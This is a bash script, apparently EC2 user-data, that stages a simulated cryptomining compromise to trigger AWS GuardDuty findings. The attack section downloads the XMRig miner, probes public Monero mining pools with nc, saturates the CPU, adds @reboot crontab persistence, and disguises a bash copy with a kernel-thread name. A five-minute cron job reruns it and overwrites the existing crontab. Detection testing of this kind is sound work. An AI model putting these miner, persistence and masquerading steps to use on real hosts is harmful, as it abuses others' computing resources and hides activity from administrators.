#!/bin/bash
# Crypto Mining Attack Simulation - REAL attack on EC2
# This will trigger GuardDuty findings

# Install CloudWatch agent
yum install -y amazon-cloudwatch-agent aws-cli

# Configure CloudWatch Logs
cat > /opt/aws/amazon-cloudwatch-agent/etc/config.json <<'EOF'
{
  "logs": {
    "logs_collected": {
      "files": {
        "collect_list": [
          {
            "file_path": "/var/log/attack-simulation.log",
            "log_group_name": "/aws/ec2/attack-simulations",
            "log_stream_name": "crypto-mining-{instance_id}"
          }
        ]
      }
    }
  }
}
EOF

# Start CloudWatch agent
/opt/aws/amazon-cloudwatch-agent/bin/amazon-cloudwatch-agent-ctl \
  -a fetch-config \
  -m ec2 \
  -s \
  -c file:/opt/aws/amazon-cloudwatch-agent/etc/config.json

# Create attack script
cat > /root/crypto-mining-attack.sh <<'ATTACK'
#!/bin/bash
LOG="/var/log/attack-simulation.log"

echo "$(date) - Starting Crypto Mining Attack Simulation" | tee -a $LOG

# 1. Download mining software (triggers GuardDuty)
echo "$(date) - Downloading XMRig miner" | tee -a $LOG
curl -s -o /tmp/xmrig https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz || true

# 2. Connect to known mining pools (triggers GuardDuty: CryptoCurrency:EC2/BitcoinTool.B!DNS)
echo "$(date) - Attempting connections to mining pools" | tee -a $LOG
nc -zv pool.supportxmr.com 3333 2>&1 | tee -a $LOG || true
nc -zv xmr-eu1.nanopool.org 14444 2>&1 | tee -a $LOG || true
nc -zv pool.minexmr.com 4444 2>&1 | tee -a $LOG || true

# 3. High CPU usage pattern
echo "$(date) - Generating high CPU usage" | tee -a $LOG
for i in {1..4}; do
  (while true; do echo "scale=5000; 4*a(1)" | bc -l > /dev/null; done) &
done

# 4. Create persistence mechanism
echo "$(date) - Creating persistence" | tee -a $LOG
echo "@reboot /tmp/miner" | crontab -

# 5. Process hiding
echo "$(date) - Hiding process as system service" | tee -a $LOG
cp /bin/bash /tmp/[kworker/0:1]

# Log completion
echo "$(date) - Crypto mining attack simulation complete" | tee -a $LOG
echo "$(date) - Expected GuardDuty findings: CryptoCurrency:EC2/BitcoinTool.B!DNS" | tee -a $LOG

# Keep running for 30 minutes then stop CPU load
sleep 1800
killall bc
ATTACK

chmod +x /root/crypto-mining-attack.sh

# Run attack after 2 minutes (give instance time to boot)
echo "*/5 * * * * /root/crypto-mining-attack.sh" | crontab -

# Run immediately
/root/crypto-mining-attack.sh &
